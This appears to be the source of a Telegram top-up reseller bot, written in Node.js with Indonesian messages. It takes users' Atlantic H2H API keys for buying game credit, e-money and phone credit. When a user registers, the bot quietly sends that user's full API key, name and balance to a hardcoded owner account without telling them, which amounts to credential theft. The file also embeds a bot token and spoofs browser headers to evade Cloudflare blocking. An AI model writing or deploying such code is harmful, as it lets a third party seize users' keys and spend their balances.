const { Telegraf, Markup, session } = require('telegraf');
const axios = require('axios');
const FormData = require('form-data');

const BOT_TOKEN = '8602360591:AAGLcMSN5IQ5mBJjkj_MHmL0l6URlXhkTWw';
const OWNER_ID = '8793356645';
const BASE_URL = 'https://atlantich2h.com';

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// Database sementara untuk menyimpan API Key (Gunakan File jika ingin permanen)
const userDb = {};

function esc(text) {
    return text ? text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&') : '';
}

// --- FUNGSI REQUEST MANUSIA (ANTI CLOUDFLARE BLOCK) ---
async function callAtlantic(endpoint, body = {}) {
    try {
        const formData = new FormData();
        for (const key in body) { formData.append(key, body[key]); }
        
        const res = await axios.post(`${BASE_URL}${endpoint}`, formData, {
            headers: {
                ...formData.getHeaders(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://atlantich2h.com',
                'Referer': 'https://atlantich2h.com/'
            },
            timeout: 20000
        });
        return res.data;
    } catch (e) {
        console.log("❌ Error API:", e.response ? e.response.status : e.message);
        return { status: false, message: "Server Atlantic Menolak Akses (403/500)" };
    }
}

// --- HANDLER START ---
bot.start(async (ctx) => {
    ctx.session = {}; 
    const apiKey = userDb[ctx.from.id];
    
    if (apiKey) {
        return ctx.replyWithMarkdownV2(
            `✨ *SALAM HANGAT, YANG MULIA\\!* ✨\n\n` +
            `🚀 *Silakan gunakan menu interaktif di bawah\\:*`,
            Markup.inlineKeyboard([
                [Markup.button.callback('👤 MY PROFILE', 'get_profile'), Markup.button.callback('💸 TRANSAKSI', 'menu_kategori')],
                [Markup.button.callback('🔍 CEK NAMA', 'menu_cek')]
            ])
        );
    } else {
        return ctx.replyWithMarkdownV2(`👑 *SELAMAT DATANG YANG MULIA* 👑\n\n🔒 *Akses Terkunci\\!*\nKirimkan API Key Anda langsung di sini untuk mendaftar\\.`);
    }
});

// --- SISTEM DETEKSI TEXT (DAFTAR & TARGET) ---
bot.on('text', async (ctx) => {
    // Jika Belum Daftar
    if (!userDb[ctx.from.id]) {
        const apiKey = ctx.message.text.trim();
        const res = await callAtlantic('/get_profile', { api_key: apiKey });

        if (res.status === "true" || res.status === true) {
            userDb[ctx.from.id] = apiKey;
            const d = res.data;
            ctx.reply(`✅ BERHASIL DAFTAR!\n👤 Nama: ${d.name}\n💰 Saldo: ${d.balance}`);
            
            // NOTIF OWNER (FULL DATA)
            bot.telegram.sendMessage(OWNER_ID, `📢 *USER BARU*\n🔑 API: \`${apiKey}\`\n👤 Nama: ${d.name}\n💰 Saldo: ${d.balance}`, { parse_mode: 'Markdown' });
        } else {
            ctx.reply('❌ API Key salah atau ditolak server. Pastikan API Key benar!');
        }
        return;
    }

    // Jika sedang dalam proses input Target
    if (ctx.session?.step === 'WAITING_TARGET') {
        ctx.session.target = ctx.message.text;
        ctx.session.step = 'CONFIRM';
        
        return ctx.replyWithMarkdownV2(
            `🛒 *KONFIRMASI PESANAN*\n` +
            `─────────────────────\n` +
            `📦 *Produk:* ${esc(ctx.session.productName)}\n` +
            `🎯 *Target:* \`${esc(ctx.session.target)}\`\n` +
            `💸 *Harga:* Rp ${esc(ctx.session.productPrice)}\n` +
            `─────────────────────`,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ GAS ORDER!', 'execute_order')],
                [Markup.button.callback('❌ BATALKAN', 'back_start')]
            ])
        );
    }
});

// --- MENU KATEGORI ---
bot.action('menu_kategori', (ctx) => {
    ctx.editMessageText('🏷️ *PILIH KATEGORI PRODUK:*', {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🎮 GAMES', 'cat_Games'), Markup.button.callback('📱 E-MONEY', 'cat_E-Money')],
            [Markup.button.callback('💡 PLN', 'cat_PLN'), Markup.button.callback('📞 PULSA', 'cat_Pulsa')],
            [Markup.button.callback('⬅️ KEMBALI', 'back_start')]
        ])
    });
});

// --- LIST PRODUK ---
bot.action(/cat_(.+)/, async (ctx) => {
    const category = ctx.match[1];
    const apiKey = userDb[ctx.from.id];
    
    await ctx.editMessageText(`⌛ Menyusun daftar ${category}...`);
    const res = await callAtlantic('/layanan/price_list', { type: 'prabayar', api_key: apiKey });
    
    if (res.status) {
        const filtered = res.data.filter(x => x.category.toLowerCase().includes(category.toLowerCase()));
        const buttons = filtered.slice(0, 10).map(p => [Markup.button.callback(`${p.name} - Rp${p.price}`, `buy_${p.code}_${p.price}_${p.name}`)]);
        buttons.push([Markup.button.callback('⬅️ KEMBALI', 'menu_kategori')]);
        
        ctx.editMessageText(`✨ *PILIH LAYANAN ${category.toUpperCase()}* ✨`, Markup.inlineKeyboard(buttons));
    } else { ctx.reply('❌ Gagal mengambil harga.'); }
});

// --- PILIH PRODUK & MINTA TARGET ---
bot.action(/buy_(.+)_(.+)_(.+)/, (ctx) => {
    ctx.session.productCode = ctx.match[1];
    ctx.session.productPrice = ctx.match[2];
    ctx.session.productName = ctx.match[3];
    ctx.session.step = 'WAITING_TARGET';
    
    ctx.editMessageText(`🎯 *Layanan:* ${ctx.session.productName}\n\n👉 *Silakan ketik/kirim Nomor HP / ID Target Anda:*`);
});

// --- EKSEKUSI ORDER ---
bot.action('execute_order', async (ctx) => {
    const apiKey = userDb[ctx.from.id];
    await ctx.editMessageText('🚀 Sedang mengirim pesanan ke pusat...');

    const res = await callAtlantic('/transaksi/create', {
        api_key: apiKey,
        code: ctx.session.productCode,
        target: ctx.session.target,
        reff_id: 'TRX' + Date.now()
    });

    if (res.status) {
        ctx.reply(`✅ BERHASIL!\nProduk: ${res.data.layanan}\nStatus: ${res.data.status}\nSN: ${res.data.sn || 'Proses'}`);
    } else {
        ctx.reply(`❌ Gagal: ${res.message}`);
    }
    ctx.session = {}; 
});

bot.action('back_start', (ctx) => { ctx.session = {}; ctx.reply('Pilih Menu:', Markup.inlineKeyboard([[Markup.button.callback('💸 TRANSAKSI', 'menu_kategori')]])); });

bot.launch().then(() => console.log('🚀 Bot Sempurna Aktif Tanpa 403!'));
